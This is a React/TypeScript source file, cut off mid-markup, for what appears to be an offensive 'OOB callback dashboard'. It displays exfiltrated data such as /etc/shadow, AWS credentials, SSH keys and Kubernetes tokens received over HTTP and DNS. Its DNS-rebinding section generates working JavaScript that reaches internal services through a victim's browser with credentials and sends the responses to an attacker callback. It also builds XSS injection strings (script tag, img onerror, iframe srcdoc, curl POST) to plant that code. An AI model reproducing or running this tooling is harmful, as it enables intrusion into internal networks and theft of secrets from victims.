import React, {
  useState, useEffect, useRef, useCallback, useMemo,
} from "react";
import { withAuthToken } from "../lib/auth";
import { useReconnectingWs } from "../hooks/use-reconnecting-ws";

// ─── Types ────────────────────────────────────────────────────────────────────

interface OobHit {
  id: string; ts: number; type: "http"; method: string; path: string;
  sourceIp: string; userAgent: string; headers: Record<string, string>;
  body: string; query: Record<string, string>; data: string;
  token: string; size: number; receivedAt?: string; decodedData?: string;
}

interface DnsSession {
  key: string; token: string; prefix: string;
  chunks: Record<number, string>; total: number; received: number;
  complete: boolean; assembled: string | null; decoded: string | null;
  byteLen: number; receivedAt: number; lastChunkAt: number;
  completedAt: number | null;
}

type RebindPhase =
  | "idle"
  | "armed"       // payload deployed, waiting for victim
  | "arm_hit"     // victim executed phase-1 (JS is running)
  | "rebind_wait" // waiting for DNS rebind + second fetch
  | "exfil"       // got response body
  | "error";

interface RebindSession {
  token: string;
  cbUrl: string;
  rebindHost: string;
  targetPort: number;
  targetPath: string;
  phase: RebindPhase;
  armTs: number | null;
  exfilTs: number | null;
  responseBody: string | null;
  errorMsg: string | null;
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

function wsBase(): string {
  const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
  return `${proto}//${window.location.host}`;
}

function timeAgo(ts: number): string {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 2) return "just now";
  if (s < 60) return `${s}s ago`;
  if (s < 3600) return `${Math.floor(s / 60)}m ago`;
  return new Date(ts).toLocaleTimeString();
}

/** Decode base64/hex/url-encoded data — browser-safe, no Buffer */
function tryDecode(raw: string): { text: string; decoded: boolean } {
  if (!raw) return { text: "", decoded: false };

  // base64
  try {
    const clean = raw.trim().replace(/[ ]/g, "+").replace(/-/g, "+").replace(/_/g, "/");
    const dec = atob(clean);
    if (/^[\x09\x0a\x0d\x20-\x7e]+$/.test(dec) && dec.length > 2) {
      return { text: dec, decoded: true };
    }
  } catch { /* not valid b64 */ }

  // hex string
  if (raw.length > 20 && /^[0-9a-f]+$/i.test(raw.trim())) {
    try {
      const hex = raw.trim();
      let out = "";
      for (let i = 0; i < hex.length - 1; i += 2) {
        const code = parseInt(hex.slice(i, i + 2), 16);
        out += String.fromCharCode(code);
      }
      if (/[\x20-\x7e]{4,}/.test(out)) return { text: out, decoded: true };
    } catch { /* not valid hex */ }
  }

  // url-encoding
  try {
    const url = decodeURIComponent(raw);
    if (url !== raw) return { text: url, decoded: true };
  } catch { /* not url-encoded */ }

  return { text: raw, decoded: false };
}

function fmtBytes(n: number): string {
  if (n < 1024) return `${n}B`;
  if (n < 1048576) return `${(n / 1024).toFixed(1)}KB`;
  return `${(n / 1048576).toFixed(2)}MB`;
}

function methodBadge(m: string): string {
  if (m === "GET")    return "bg-emerald-900/60 text-emerald-400 border border-emerald-800/50";
  if (m === "POST")   return "bg-blue-900/60 text-blue-400 border border-blue-800/50";
  if (m === "PUT" || m === "PATCH") return "bg-amber-900/60 text-amber-400 border border-amber-800/50";
  if (m === "DELETE") return "bg-red-900/60 text-red-400 border border-red-800/50";
  return "bg-zinc-800 text-zinc-400 border border-zinc-700";
}

const PREFIX_LABELS: Record<string, string> = {
  p:   "/etc/passwd",
  e:   "ENV secrets",
  s:   "/etc/shadow",
  aws: "AWS creds",
  ssh: "SSH keys",
  m:   "mass-dump",
  k:   "K8s token",
  py:  "Python exec",
  w:   "Win ENV",
};

// ─── DNS Rebind payload builder ───────────────────────────────────────────────

function buildRebindPayload(
  cbUrl: string,
  rebindHost: string,
  targetPort: number,
  targetPath: string,
): string {
  // Self-contained JS snippet injected into victim page.
  // Phase 1: arm beacon — confirms JS runs.
  // Phase 2 (after delay): re-fetches via rebindHost which by then resolves to internal IP.
  // Phase 3: exfils response body to OOB callback.
  return `(function(){
  var _cb='${cbUrl}';
  var _rh='${rebindHost}';
  var _rp=${targetPort};
  var _path='${targetPath.replace(/'/g, "\\'")}';
  function _b64(s){try{return btoa(unescape(encodeURIComponent(s)));}catch(e){return btoa(s.substring(0,2048));}}
  function _oob(phase,d){
    try{new Image().src=_cb+'?phase='+phase+'&d='+encodeURIComponent(d||'');}catch(e){}
    try{fetch(_cb+'?phase='+phase+'&d='+encodeURIComponent(d||''),{mode:'no-cors'});}catch(e){}
  }
  _oob('arm',_b64(navigator.userAgent+' '+location.href));
  var _delay=2500;
  setTimeout(function(){
    var _url='http://'+_rh+':'+_rp+_path;
    var _fopt={mode:'cors',credentials:'include',headers:{'Accept':'*/*'}};
    _oob('rebind_fetch',_b64(_url));
    fetch(_url,_fopt).then(function(r){
      var ct=r.headers.get('content-type')||'';
      return r.text().then(function(body){
        _oob('exfil',_b64('['+r.status+']['+ct+']\n'+body.slice(0,8192)));
      });
    }).catch(function(err){
      _oob('error',_b64(String(err)));
      /* Fallback: XMLHttpRequest (bypasses some CORS pre-flight) */
      try{
        var x=new XMLHttpRequest();
        x.open('GET','http://'+_rh+':'+_rp+_path,true);
        x.withCredentials=true;
        x.onload=function(){_oob('exfil_xhr',_b64('['+x.status+']\n'+x.responseText.slice(0,8192)));};
        x.onerror=function(){_oob('error_xhr',_b64('XHR failed'));};
        x.send();
      }catch(e){_oob('error_xhr',_b64(String(e)));}
    });
  },_delay);
})();`.trim();
}

function buildRebindInjectionCmds(
  targetUrl: string,
  payload: string,
  cbUrl: string,
): Record<string, string> {
  const enc = encodeURIComponent(payload);
  return {
    script_tag:
      `<script>${payload}<\/script>`,
    xss_url_inject:
      `${targetUrl}?q=<script>${enc}<\/script>`,
    curl_post_inject:
      `curl -sk -X POST '${targetUrl}' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data-urlencode "comment=${payload}"`,
    img_onerror:
      `<img src=x onerror="${payload.replace(/"/g, "&quot;")}">`,
    srcdoc_iframe:
      `<iframe srcdoc="<script>${enc}<\/script>">`,
    jsonp_callback:
      `${targetUrl}?callback=<script>${enc}<\/script>`,
    link_tag_import:
      `<link rel=import href='data:text/html,<script>${enc}<\/script>'>`,
    watch_cb:
      `# Watch for incoming callback on token:\ncurl -N '${cbUrl.replace(/\/cb\/.*$/, "/hits/stream")}'`,
  };
}

// ─── Component ────────────────────────────────────────────────────────────────

export default function OobPanel() {
  type Tab = "live" | "dns" | "rebind" | "stats";

  const [tab,          setTab]          = useState<Tab>("live");
  const [hits,         setHits]         = useState<OobHit[]>([]);
  const [dnsSessions,  setDnsSessions]  = useState<DnsSession[]>([]);
  const [expanded,     setExpanded]     = useState<string | null>(null);
  const [expandedDns,  setExpandedDns]  = useState<string | null>(null);
  const [filter,       setFilter]       = useState("");
  const [flash,        setFlash]        = useState<string | null>(null);
  const [lastHitTime,  setLastHitTime]  = useState<number | null>(null);
  const [copied,       setCopied]       = useState<string | null>(null);
  const [autoScroll,   setAutoScroll]   = useState(true);
  const feedRef = useRef<HTMLDivElement | null>(null);

  // ── Rebind state ──
  const [rebindHost,   setRebindHost]   = useState("");
  const [rebindPort,   setRebindPort]   = useState("80");
  const [rebindPath,   setRebindPath]   = useState("/");
  const [rebindToken,  setRebindToken]  = useState("");
  const [rebindCbUrl,  setRebindCbUrl]  = useState("");
  const [rebindStatus, setRebindStatus] = useState<RebindSession | null>(null);
  const [tokenLoading, setTokenLoading] = useState(false);
  const [rebindTab,    setRebindTab]    = useState<"setup" | "payload" | "live">("setup");

  // ── WS via robust hook ────────────────────────────────────────────────────

  const onMessage = useCallback((msg: unknown) => {
    const m = msg as Record<string, unknown>;
    if (!m || typeof m !== "object") return;

    if (m["type"] === "snapshot") {
      setHits((m["hits"] as OobHit[] | undefined) ?? []);
      setDnsSessions((m["sessions"] as DnsSession[] | undefined) ?? []);
    } else if (m["type"] === "hit") {
      const hit = m["hit"] as OobHit;
      setHits(prev => [hit, ...prev].slice(0, 1000));
      setLastHitTime(Date.now());
      setFlash(hit.id);
      setTimeout(() => setFlash(f => f === hit.id ? null : f), 800);
      // Update rebind session phase from OOB hit
      setRebindStatus(prev => {
        if (!prev || hit.token !== prev.token) return prev;
        const phase = (hit.query["phase"] ?? "") as string;
        const data  = hit.decodedData ?? tryDecode(hit.query["d"] ?? "").text;
        if (phase === "arm")          return { ...prev, phase: "arm_hit",     armTs: Date.now() };
        if (phase === "rebind_fetch") return { ...prev, phase: "rebind_wait" };
        if (phase === "exfil" || phase === "exfil_xhr")
          return { ...prev, phase: "exfil", exfilTs: Date.now(), responseBody: data };
        if (phase === "error" || phase === "error_xhr")
          return { ...prev, phase: "error", errorMsg: data };
        return prev;
      });
    } else if (m["type"] === "dns_session") {
      const sess = m["session"] as DnsSession;
      setDnsSessions(prev => {
        const idx = prev.findIndex(s => s.key === sess.key);
        if (idx >= 0) { const n = [...prev]; n[idx] = sess; return n; }
        return [sess, ...prev].slice(0, 500);
      });
    } else if (m["type"] === "dns_chunk") {
      setDnsSessions(prev => prev.map(s =>
        s.key === (m["key"] as string)
          ? { ...s, received: s.received + 1, lastChunkAt: Date.now() }
          : s,
      ));
    } else if (m["type"] === "dns_complete") {
      const sess = m["session"] as DnsSession;
      setDnsSessions(prev => prev.map(s => s.key === sess.key ? sess : s));
    } else if (m["type"] === "cleared") {
      setHits([]);
    } else if (m["type"] === "dns_cleared") {
      setDnsSessions([]);
    }
  }, []);

  const { status: wsStatus, connect, disconnect, send } = useReconnectingWs({
    onMessage,
    maxRetries: "infinite",
  });

  // Connect on mount; reconnect keeps itself alive via the hook.
  useEffect(() => {
    const url = withAuthToken(`${wsBase()}/api/ws/oob`);
    connect(url, { action: "subscribe" });
    return () => disconnect();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Keep-alive ping every 25 s to defeat proxy idle timeouts.
  useEffect(() => {
    const id = setInterval(() => {
      if (wsStatus === "open") send({ action: "ping" });
    }, 25_000);
    return () => clearInterval(id);
  }, [wsStatus, send]);

  // Auto-scroll live feed (independent of WS, no reconnects triggered).
  useEffect(() => {
    if (autoScroll && feedRef.current) feedRef.current.scrollTop = 0;
  }, [hits, autoScroll]);

  const clearHits = useCallback(() => {
    send({ action: "clear_hits" });
    setHits([]);
  }, [send]);

  const clearDns = useCallback(() => {
    send({ action: "clear_dns" });
    setDnsSessions([]);
  }, [send]);

  const copy = useCallback((text: string, key: string) => {
    navigator.clipboard.writeText(text).catch(() => {});
    setCopied(key);
    setTimeout(() => setCopied(k => k === key ? null : k), 1800);
  }, []);

  // ── Fetch OOB token for rebind ──────────────────────────────────────────

  const fetchRebindToken = useCallback(async () => {
    setTokenLoading(true);
    try {
      const r = await fetch("/api/oob/token", {
        headers: { Authorization: `Bearer ${sessionStorage.getItem("nxauth_v7") ?? ""}` },
      });
      if (!r.ok) throw new Error(`HTTP ${r.status}`);
      const j = await r.json() as { token: string; cbUrl: string };
      setRebindToken(j.token);
      setRebindCbUrl(j.cbUrl);
      setRebindStatus({
        token: j.token,
        cbUrl: j.cbUrl,
        rebindHost,
        targetPort: parseInt(rebindPort, 10) || 80,
        targetPath: rebindPath || "/",
        phase: "idle",
        armTs: null,
        exfilTs: null,
        responseBody: null,
        errorMsg: null,
      });
    } catch { /* silently fail — UI shows missing token state */ }
    setTokenLoading(false);
  }, [rebindHost, rebindPort, rebindPath]);

  const armRebind = useCallback(() => {
    if (!rebindToken || !rebindHost) return;
    setRebindStatus(prev => prev ? { ...prev, phase: "armed", armTs: null, exfilTs: null, responseBody: null, errorMsg: null, rebindHost, targetPort: parseInt(rebindPort, 10) || 80, targetPath: rebindPath || "/" } : prev);
    setRebindTab("live");
  }, [rebindToken, rebindHost, rebindPort, rebindPath]);

  // ── Derived ─────────────────────────────────────────────────────────────

  const filteredHits = useMemo(() => {
    if (!filter.trim()) return hits;
    const q = filter.toLowerCase();
    return hits.filter(h =>
      h.token.includes(q) || h.sourceIp.includes(q) ||
      h.method.toLowerCase().includes(q) || h.path.toLowerCase().includes(q) ||
      h.data.toLowerCase().includes(q) || (h.decodedData ?? "").toLowerCase().includes(q),
    );
  }, [hits, filter]);

  const stats = useMemo(() => {
    const uniqueTokens = new Set(hits.map(h => h.token)).size;
    const uniqueIps    = new Set(hits.map(h => h.sourceIp)).size;
    const totalBytes   = hits.reduce((a, h) => a + h.size, 0);
    const completeDns  = dnsSessions.filter(s => s.complete).length;
    return { total: hits.length, uniqueTokens, uniqueIps, totalBytes, completeDns, totalDns: dnsSessions.length };
  }, [hits, dnsSessions]);

  const wsIndicator =
    wsStatus === "open"
      ? <span className="flex items-center gap-1 text-emerald-400"><span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse inline-block" />{" "}LIVE</span>
      : wsStatus === "connecting" || wsStatus === "reconnecting"
      ? <span className="flex items-center gap-1 text-yellow-500"><span className="w-2 h-2 rounded-full bg-yellow-500 animate-pulse inline-block" />{" "}
          {wsStatus === "reconnecting" ? "RECONNECTING…" : "CONNECTING…"}
        </span>
      : <span className="flex items-center gap-1 text-red-500"><span className="w-2 h-2 rounded-full bg-red-600 inline-block" />DISCONNECTED</span>;

  // ── Rebind payload (memoized) ────────────────────────────────────────────

  const rebindPayload = useMemo(() => {
    if (!rebindToken || !rebindHost || !rebindCbUrl) return "";
    return buildRebindPayload(
      rebindCbUrl,
      rebindHost,
      parseInt(rebindPort, 10) || 80,
      rebindPath || "/",
    );
  }, [rebindToken, rebindHost, rebindPort, rebindPath, rebindCbUrl]);

  const rebindCmds = useMemo(() => {
    if (!rebindPayload || !rebindToken || !rebindCbUrl) return {} as Record<string, string>;
    return buildRebindInjectionCmds(
      `http://${rebindHost || "TARGET"}`,
      rebindPayload,
      rebindCbUrl,
    );
  }, [rebindPayload, rebindHost, rebindToken, rebindCbUrl]);

  const PHASE_LABELS: Record<RebindPhase, string> = {
    idle:        "IDLE",
    armed:       "ARMED — WAITING FOR VICTIM",
    arm_hit:     "VICTIM HIT — JS EXECUTING",
    rebind_wait: "REBIND IN PROGRESS…",
    exfil:       "EXFIL COMPLETE",
    error:       "ERROR",
  };

  const PHASE_COLOR: Record<RebindPhase, string> = {
    idle:        "text-zinc-500",
    armed:       "text-yellow-400",
    arm_hit:     "text-cyan-400",
    rebind_wait: "text-purple-400",
    exfil:       "text-emerald-400",
    error:       "text-red-400",
  };

  // ── Render ───────────────────────────────────────────────────────────────

  return (
    <div className="flex flex-col h-full bg-black text-zinc-200 font-mono text-xs select-none">

      {/* ── Header ─────────────────────────────────────────── */}
      <div className="flex items-center justify-between px-3 py-2 border-b border-zinc-900 shrink-0">
        <div className="flex items-center gap-3">
          <span className="text-red-500 font-bold tracking-widest text-[10px]">OOB CALLBACK DASHBOARD</span>
          <span className="text-[9px]">{wsIndicator}</span>
          {lastHitTime && (
            <span className="text-zinc-500 text-[9px]">last hit: {timeAgo(lastHitTime)}</span>
          )}
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={() => setAutoScroll(v => !v)}
            className={`px-2 py-0.5 text-[9px] border rounded transition-colors ${autoScroll ? "border-emerald-700 text-emerald-400 bg-emerald-950/40" : "border-zinc-700 text-zinc-500"}`}
          >
            {autoScroll ? "AUTO-SCROLL ON" : "AUTO-SCROLL OFF"}
          </button>
          <button
            onClick={() => {
              const url = withAuthToken(`${wsBase()}/api/ws/oob`);
              connect(url, { action: "subscribe" });
            }}
            className="px-2 py-0.5 text-[9px] border border-zinc-700 text-zinc-400 hover:text-zinc-200 rounded"
          >RECONNECT</button>
        </div>
      </div>

      {/* ── Stats bar ──────────────────────────────────────── */}
      <div className="grid grid-cols-5 gap-px border-b border-zinc-900 shrink-0 bg-zinc-900">
        {([
          ["HITS",       String(stats.total),        "text-red-400"],
          ["TOKENS",     String(stats.uniqueTokens), "text-amber-400"],
          ["SOURCE IPs", String(stats.uniqueIps),    "text-cyan-400"],
          ["DATA",       fmtBytes(stats.totalBytes),  "text-purple-400"],
          ["DNS OOB",    `${stats.completeDns}/${stats.totalDns}`, "text-emerald-400"],
        ] as [string, string, string][]).map(([label, val, cls]) => (
          <div key={label} className="bg-black px-3 py-2 flex flex-col gap-0.5">
            <span className="text-zinc-600 text-[8px] tracking-widest uppercase">{label}</span>
            <span className={`${cls} text-sm font-bold leading-none`}>{val}</span>
          </div>
        ))}
      </div>

      {/* ── Tab bar ────────────────────────────────────────── */}
      <div className="flex items-center gap-0 border-b border-zinc-900 shrink-0">
        {(["live", "dns", "rebind", "stats"] as const).map(t => (
          <button key={t} onClick={() => setTab(t)}
            className={`px-4 py-2 text-[10px] uppercase tracking-wider border-r border-zinc-900 transition-colors ${tab === t ? "bg-black text-red-400 border-b border-red-600" : "text-zinc-600 hover:text-zinc-400"}`}>
            {t === "live"   ? `LIVE FEED (${filteredHits.length})`
            : t === "dns"   ? `DNS OOB (${dnsSessions.length})`
            : t === "rebind"? "DNS REBIND"
            :                 "STATS"}
          </button>
        ))}
        <div className="flex-1 flex items-center gap-2 px-3">
          {(tab === "live" || tab === "dns") && (
            <>
              <input
                value={filter} onChange={e => setFilter(e.target.value)}
                placeholder="filter by token / IP / path / data…"
                className="flex-1 bg-transparent border-0 outline-none text-zinc-300 placeholder-zinc-700 text-xs"
              />
              {filter && <button onClick={() => setFilter("")} className="text-zinc-600 hover:text-zinc-400">✕</button>}
            </>
          )}
        </div>
        {tab === "live" && (
          <button onClick={clearHits}
            className="px-3 py-2 text-[9px] text-red-700 hover:text-red-400 border-l border-zinc-900 transition-colors">
            CLEAR HITS
          </button>
        )}
        {tab === "dns" && (
          <button onClick={clearDns}
            className="px-3 py-2 text-[9px] text-red-700 hover:text-red-400 border-l border-zinc-900 transition-colors">
            CLEAR DNS
          </button>
        )}
      </div>

      {/* ── Body ───────────────────────────────────────────── */}
      <div ref={feedRef} className="flex-1 overflow-y-auto">

        {/* LIVE FEED */}
        {tab === "live" && (
          filteredHits.length === 0 ? (
            <div className="flex flex-col items-center justify-center h-full gap-3 text-zinc-700">
              <div className="text-3xl">⚡</div>
              <div className="text-sm">No OOB callbacks yet</div>
              <div className="text-[10px]">Fire payloads from AutoChain to see real-time hits here</div>
            </div>
          ) : (
            <div className="divide-y divide-zinc-900">
              {filteredHits.map(hit => {
                const isExpanded = expanded === hit.id;
                const isNew      = flash === hit.id;
                const decoded    = tryDecode(hit.data || hit.decodedData || "");
                return (
                  <div key={hit.id}
                    className={`transition-all duration-200 ${isNew ? "bg-red-950/40 border-l-2 border-red-500" : "border-l-2 border-transparent hover:bg-zinc-900/30"}`}>
                    <div
                      className="flex items-center gap-2 px-3 py-2 cursor-pointer"
                      onClick={() => setExpanded(isExpanded ? null : hit.id)}
                    >
                      <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded ${methodBadge(hit.method)}`}>{hit.method}</span>
                      <span className="text-zinc-300 truncate flex-1 max-w-[180px]">{hit.path}</span>
                      <span className="text-zinc-600 shrink-0">{hit.sourceIp}</span>
                      <span className="text-amber-600 font-mono text-[9px] shrink-0 bg-amber-950/30 px-1 rounded">
                        {hit.token.slice(0, 8)}
                      </span>
                      {hit.size > 0 && (
                        <span className="text-zinc-600 text-[9px] shrink-0">{fmtBytes(hit.size)}</span>
                      )}
                      <span className="text-zinc-700 text-[9px] shrink-0">{timeAgo(hit.ts)}</span>
                      {decoded.decoded && (
                        <span className="text-emerald-500 text-[8px] font-bold border border-emerald-800 px-1 rounded shrink-0">DECODED</span>
                      )}
                      <span className={`text-zinc-600 text-[9px] ml-auto shrink-0 transition-transform ${isExpanded ? "rotate-90" : ""}`}>▶</span>
                    </div>

                    {isExpanded && (
                      <div className="px-3 pb-3 flex flex-col gap-2 border-t border-zinc-900/50">
                        {decoded.text && (
                          <div className="mt-2">
                            <div className="flex items-center justify-between mb-1">
                              <span className="text-[9px] text-zinc-600 uppercase tracking-wider">
                                {decoded.decoded ? "EXFILTRATED DATA (decoded)" : "RAW DATA"}
                              </span>
                              <button onClick={() => copy(decoded.text, hit.id + "_data")}
                                className="text-[8px] text-zinc-600 hover:text-zinc-300">
                                {copied === hit.id + "_data" ? "copied!" : "copy"}
                              </button>
                            </div>
                            <pre className="bg-zinc-950 border border-zinc-800 rounded p-2 text-[10px] text-emerald-300 overflow-x-auto max-h-40 whitespace-pre-wrap break-all">
                              {decoded.text}
                            </pre>
                          </div>
                        )}

                        <div className="grid grid-cols-2 gap-2 mt-1">
                          <div>
                            <div className="text-[9px] text-zinc-600 uppercase tracking-wider mb-1">QUERY PARAMS</div>
                            <div className="bg-zinc-950 border border-zinc-800/50 rounded p-2 text-[10px] text-zinc-400 space-y-0.5 max-h-24 overflow-y-auto">
                              {Object.keys(hit.query).length === 0
                                ? <span className="text-zinc-700">—</span>
                                : Object.entries(hit.query).map(([k, v]) => (
                                  <div key={k}><span className="text-cyan-600">{k}</span><span className="text-zinc-600">: </span>{v}</div>
                                ))}
                            </div>
                          </div>
                          <div>
                            <div className="text-[9px] text-zinc-600 uppercase tracking-wider mb-1">HEADERS</div>
                            <div className="bg-zinc-950 border border-zinc-800/50 rounded p-2 text-[10px] text-zinc-400 space-y-0.5 max-h-24 overflow-y-auto">
                              {Object.entries(hit.headers).slice(0, 12).map(([k, v]) => (
                                <div key={k} className="truncate"><span className="text-purple-600">{k}</span><span className="text-zinc-600">: </span>{v}</div>
                              ))}
                            </div>
                          </div>
                        </div>

                        {hit.body && (
                          <div>
                            <div className="flex items-center justify-between mb-1">
                              <span className="text-[9px] text-zinc-600 uppercase tracking-wider">REQUEST BODY</span>
                              <button onClick={() => copy(hit.body, hit.id + "_body")}
                                className="text-[8px] text-zinc-600 hover:text-zinc-300">
                                {copied === hit.id + "_body" ? "copied!" : "copy"}
                              </button>
                            </div>
                            <pre className="bg-zinc-950 border border-zinc-800 rounded p-2 text-[10px] text-zinc-300 overflow-x-auto max-h-32 whitespace-pre-wrap break-all">
                              {hit.body}
                            </pre>
                          </div>
                        )}

                        <div className="flex items-center gap-3 text-[9px] text-zinc-600 pt-1 border-t border-zinc-900">
                          <span>UA: {(hit.userAgent || "—").slice(0, 60)}</span>
                          <span className="ml-auto">{hit.receivedAt ?? new Date(hit.ts).toISOString()}</span>
                        </div>
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )
        )}

        {/* DNS OOB */}
        {tab === "dns" && (
          dnsSessions.length === 0 ? (
            <div className="flex flex-col items-center justify-center h-full gap-3 text-zinc-700">
              <div className="text-3xl">🔍</div>
              <div className="text-sm">No DNS OOB sessions yet</div>
              <div className="text-[10px]">DNS-based exfiltration callbacks will appear here</div>
            </div>
          ) : (
            <div className="divide-y divide-zinc-900">
              {dnsSessions.map(sess => {
                const isExpanded = expandedDns === sess.key;
                const pct = sess.total > 0 ? Math.round((sess.received / sess.total) * 100) : 0;
                return (
                  <div key={sess.key} className="border-l-2 border-transparent hover:bg-zinc-900/30">
                    <div className="flex items-center gap-2 px-3 py-2 cursor-pointer"
                      onClick={() => setExpandedDns(isExpanded ? null : sess.key)}>
                      <span className={`text-[9px] font-bold border rounded px-1.5 py-0.5 ${sess.complete ? "border-emerald-700 text-emerald-400 bg-emerald-950/30" : "border-yellow-700 text-yellow-400 bg-yellow-950/30"}`}>
                        {sess.complete ? "COMPLETE" : "IN PROGRESS"}
                      </span>
                      <span className="text-purple-400 font-mono text-[10px]">{PREFIX_LABELS[sess.prefix] ?? sess.prefix}</span>
                      <span className="text-amber-600 text-[9px] font-mono">{sess.token.slice(0, 8)}</span>
                      <div className="flex-1 h-1 bg-zinc-800 rounded overflow-hidden mx-2">
                        <div className={`h-full rounded transition-all ${sess.complete ? "bg-emerald-600" : "bg-yellow-600"}`}
                          style={{ width: `${pct}%` }} />
                      </div>
                      <span className="text-zinc-500 text-[9px]">{sess.received}/{sess.total || "?"}</span>
                      <span className="text-zinc-500 text-[9px]">{fmtBytes(sess.byteLen)}</span>
                      <span className="text-zinc-700 text-[9px]">{timeAgo(sess.receivedAt)}</span>
                      <span className={`text-zinc-600 text-[9px] ml-auto shrink-0 transition-transform ${isExpanded ? "rotate-90" : ""}`}>▶</span>
                    </div>
                    {isExpanded && sess.assembled && (
                      <div className="px-3 pb-3 border-t border-zinc-900/50">
                        {sess.decoded ? (
                          <>
                            <div className="flex items-center justify-between mb-1 mt-2">
                              <span className="text-[9px] text-zinc-600 uppercase tracking-wider">DECODED EXFIL DATA</span>
                              <button onClick={() => copy(sess.decoded!, sess.key + "_dec")}
                                className="text-[8px] text-zinc-600 hover:text-zinc-300">
                                {copied === sess.key + "_dec" ? "copied!" : "copy"}
                              </button>
                            </div>
                            <pre className="bg-zinc-950 border border-zinc-800 rounded p-2 text-[10px] text-emerald-300 overflow-x-auto max-h-48 whitespace-pre-wrap break-all">
                              {sess.decoded}
                            </pre>
                          </>
                        ) : (
                          <>
                            <div className="text-[9px] text-zinc-600 uppercase tracking-wider mb-1 mt-2">RAW ASSEMBLED</div>
                            <pre className="bg-zinc-950 border border-zinc-800 rounded p-2 text-[10px] text-zinc-300 overflow-x-auto max-h-48 whitespace-pre-wrap break-all">
                              {sess.assembled}
                            </pre>
                          </>
                        )}
                        <div className="flex items-center gap-3 text-[9px] text-zinc-600 pt-2 border-t border-zinc-900 mt-2">
                          <span>started: {new Date(sess.receivedAt).toISOString()}</span>
                          {sess.completedAt && <span>done: {new Date(sess.completedAt).toISOString()}</span>}
                        </div>
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          )
        )}

        {/* DNS REBIND */}
        {tab === "rebind" && (
          <div className="flex flex-col h-full">
            {/* rebind sub-tabs */}
            <div className="flex items-center border-b border-zinc-900 shrink-0">
              {(["setup", "payload", "live"] as const).map(t => (
                <button key={t} onClick={() => setRebindTab(t)}
                  className={`px-4 py-2 text-[10px] uppercase tracking-wider border-r border-zinc-900 transition-colors ${rebindTab === t ? "text-red-400 border-b border-red-700 bg-black" : "text-zinc-600 hover:text-zinc-400"}`}>
                  {t === "setup" ? "SETUP" : t === "payload" ? "PAYLOADS" : "LIVE STATUS"}
                </button>
              ))}
              <div className="flex-1" />
              {rebindStatus && rebindStatus.phase !== "idle" && (
                <span className={`px-3 text-[9px] font-bold ${PHASE_COLOR[rebindStatus.phase]}`}>
                  ● {PHASE_LABELS[rebindStatus.phase]}
                </span>
              )}
            </div>

            <div className="flex-1 overflow-y-auto p-4">

              {/* SETUP */}
              {rebindTab === "setup" && (
                <div className="space-y-4 max-w-2xl">
                  <div className="bg-zinc-900/40 border border-zinc-800/50 rounded p-3 space-y-1">
                    <div className="text-[9px] text-red-400 uppercase tracking-widest mb-2 font-bold">DNS REBINDING ATTACK</div>
                    <p className="text-zinc-500 text-[10px] leading-relaxed">
                      DNS rebinding bypasses the browser Same-Origin Policy by abusing DNS TTL expiry.
                      The victim browser resolves your domain to your IP (phase 1), loads and executes your JS,
                      then after the DNS TTL expires your domain is rebound to the target&apos;s <em>internal</em> IP (phase 2).
                      The JS re-fetches from &ldquo;same origin&rdquo; — the browser sends the request to the internal service,
                      and the response is exfiltrated to this OOB callback.
                    </p>
                    <div className="mt-2 text-[10px] text-zinc-600 leading-loose">
                      <span className="text-cyan-500">Phase 1</span>: victim.js executes → arm beacon fires<br/>
                      <span className="text-purple-400">Phase 2</span>: DNS rebinds to internal IP → second fetch<br/>
                      <span className="text-emerald-400">Phase 3</span>: response body exfiltrated via OOB callback
                    </div>
                  </div>

                  <div className="space-y-3">
                    <div>
                      <label className="text-[9px] text-zinc-500 uppercase tracking-wider block mb-1">
                        Rebind Hostname
                        <span className="text-zinc-700 ml-2 normal-case tracking-normal">
                          (domain you control with 1-5s DNS TTL, e.g. rebind.attacker.com)
                        </span>
                      </label>
                      <input
                        value={rebindHost}
                        onChange={e => setRebindHost(e.target.value)}
                        placeholder="rebind.yourdomain.com"
                        className="w-full bg-zinc-950 border border-zinc-800 rounded px-3 py-2 text-xs text-zinc-200 outline-none focus:border-red-800 font-mono"
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="text-[9px] text-zinc-500 uppercase tracking-wider block mb-1">
                          Target Port
                        </label>
                        <input
                          value={rebindPort}
                          onChange={e => setRebindPort(e.target.value)}
                          placeholder="80"
                          className="w-full bg-zinc-950 border border-zinc-800 rounded px-3 py-2 text-xs text-zinc-200 outline-none focus:border-red-800 font-mono"
                        />
                      </div>
                      <div>
                        <label className="text-[9px] text-zinc-500 uppercase tracking-wider block mb-1">
                          Target Path
                        </label>
                        <input
                          value={rebindPath}
                          onChange={e => setRebindPath(e.target.value)}
                          placeholder="/"
                          className="w-full bg-zinc-950 border border-zinc-800 rounded px-3 py-2 text-xs text-zinc-200 outline-none focus:border-red-800 font-mono"
                        />
                      </div>
                    </div>

                    <div className="flex items-center gap-3 pt-1">
                      <button
                        onClick={fetchRebindToken}
                        disabled={!rebindHost || tokenLoading}
                        className="px-4 py-2 bg-zinc-900 border border-zinc-700 text-zinc-300 hover:border-red-700 hover:text-red-400 text-[10px] uppercase tracking-wider rounded transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
                      >
                        {tokenLoading ? "GENERATING…" : rebindToken ? "REGENERATE TOKEN" : "GENERATE OOB TOKEN"}
                      </button>
                      {rebindToken && (
                        <button
                          onClick={armRebind}
                          className="px-4 py-2 bg-red-950/50 border border-red-800 text-red-400 hover:bg-red-900/40 text-[10px] uppercase tracking-wider rounded transition-colors"
                        >
                          ARM ATTACK
                        </button>
                      )}
                    </div>

                    {rebindToken && (
                      <div className="bg-zinc-950 border border-zinc-800/50 rounded p-3 space-y-1.5 text-[10px]">
                        <div className="flex items-center justify-between">
                          <span className="text-zinc-600 uppercase text-[9px] tracking-wider">OOB Token</span>
                          <button onClick={() => copy(rebindToken, "rbtoken")} className="text-zinc-600 hover:text-zinc-300 text-[8px]">
                            {copied === "rbtoken" ? "copied!" : "copy"}
                          </button>
                        </div>
                        <div className="font-mono text-amber-400">{rebindToken}</div>
                        <div className="flex items-center justify-between mt-1">
